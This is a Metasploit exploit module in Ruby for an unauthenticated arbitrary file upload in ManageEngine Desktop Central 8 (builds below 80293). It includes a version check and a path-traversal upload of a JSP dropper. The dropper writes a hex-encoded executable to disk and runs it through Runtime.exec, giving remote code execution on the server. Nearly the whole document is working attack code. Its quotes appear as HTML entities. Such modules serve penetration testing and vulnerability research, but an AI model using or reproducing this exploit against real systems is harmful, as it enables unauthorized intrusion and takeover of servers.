# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;DesktopCentral AgentLogUpload Arbitrary File Upload&#039;,
      &#039;Description&#039;    => %q{
        This module exploits an arbitrary file upload vulnerability in DesktopCentral 8.0.0
        below  build 80293. A malicious user can upload a JSP file into the web root without
        authentication, leading to arbitrary code execution.
      },
      &#039;Author&#039;         =>
        [
          &#039;Thomas Hibbert <thomas.hibbert[at]security-assessment.com>&#039; # Vulnerability discovery and MSF module
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [ &#039;URL&#039;, &#039;http://security-assessment.com/files/documents/advisory/Desktop%20Central%20Arbitrary%20File%20Upload.pdf&#039; ]
        ],
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Arch&#039;           => ARCH_X86,
      &#039;Targets&#039;        =>
        [
          [ &#039;Manage Desktop Central 8 server / Windows&#039;, {} ]
        ],
      &#039;Privileged&#039;     => true,
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Nov 11 2013&#039;
    ))

    register_options([Opt::RPORT(8020)], self.class)
  end

  def upload_file(filename, contents)
    res = send_request_cgi({
      &#039;uri&#039;     => normalize_uri("agentLogUploader?computerName=DesktopCentral&domainName=webapps&customerId=..&filename=#{filename}"),
      &#039;method&#039;  => &#039;POST&#039;,
      &#039;data&#039;    => contents,
      &#039;ctype&#039;   => "text/html"
    })

    if res and res.code == 200 and res.body.to_s.empty?
      return true
    else
      return false
    end
  end

  def check
    res = send_request_cgi({
        &#039;uri&#039; => normalize_uri("configurations.do"),
        &#039;method&#039; => &#039;GET&#039;
    })

    if res and res.code == 200 and res.body.to_s =~ /ManageEngine Desktop Central 8/ and res.body.to_s =~ /id="buildNum" value="([0-9]+)"\/>/
      build = $1
      print_status("Manage Desktop Central 8 build #{build} found")
      if build < "80293"
        return Exploit::CheckCode::Vulnerable
      else
        return Exploit::CheckCode::Safe
      end
    end

    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri("agentLogUploader"),
      &#039;method&#039; => &#039;POST&#039;
    })

    if res and res.code == 200
      return Exploit::CheckCode::Detected
    end

    return Exploit::CheckCode::Safe
  end

  def exploit
    print_status("#{peer} - Uploading JSP to execute the payload")

    exe = payload.encoded_exe
    exe_filename = rand_text_alpha_lower(8) + ".exe"

    dropper = jsp_drop_and_execute(exe, exe_filename)
    dropper_filename = rand_text_alpha_lower(8) + ".jsp"

    if upload_file(dropper_filename, dropper)
      register_files_for_cleanup(exe_filename)
      register_files_for_cleanup("..\\webapps\\DesktopCentral\\#{dropper_filename}")
    else
      fail_with(Exploit::Failure::Unknown, "#{peer} - JSP upload failed")
    end

    print_status("#{peer} - Executing payload")
    send_request_cgi(
    {
      &#039;uri&#039;    => normalize_uri(dropper_filename),
      &#039;method&#039; => &#039;GET&#039;
    })
  end

  def jsp_drop_bin(bin_data, output_file)
    jspraw =  %Q|<%@ page import="java.io.*" %>\n|
    jspraw << %Q|<%\n|
    jspraw << %Q|String data = "#{Rex::Text.to_hex(bin_data, "")}";\n|

    jspraw << %Q|FileOutputStream outputstream = new FileOutputStream("#{output_file}");\n|

    jspraw << %Q|int numbytes = data.length();\n|

    jspraw << %Q|byte[] bytes = new byte[numbytes/2];\n|
    jspraw << %Q|for (int counter = 0; counter < numbytes; counter += 2)\n|
    jspraw << %Q|{\n|
    jspraw << %Q|  char char1 = (char) data.charAt(counter);\n|
    jspraw << %Q|  char char2 = (char) data.charAt(counter + 1);\n|
    jspraw << %Q|  int comb = Character.digit(char1, 16) & 0xff;\n|
    jspraw << %Q|  comb <<= 4;\n|
    jspraw << %Q|  comb += Character.digit(char2, 16) & 0xff;\n|
    jspraw << %Q|  bytes[counter/2] = (byte)comb;\n|
    jspraw << %Q|}\n|

    jspraw << %Q|outputstream.write(bytes);\n|
    jspraw << %Q|outputstream.close();\n|
    jspraw << %Q|%>\n|

    jspraw
  end

  def jsp_execute_command(command)
    jspraw =  %Q|\n|
    jspraw << %Q|<%\n|
    jspraw << %Q|Runtime.getRuntime().exec("#{command}");\n|
    jspraw << %Q|%>\n|

    jspraw
  end

  def jsp_drop_and_execute(bin_data, output_file)
    jsp_drop_bin(bin_data, output_file) + jsp_execute_command(output_file)
  end
end

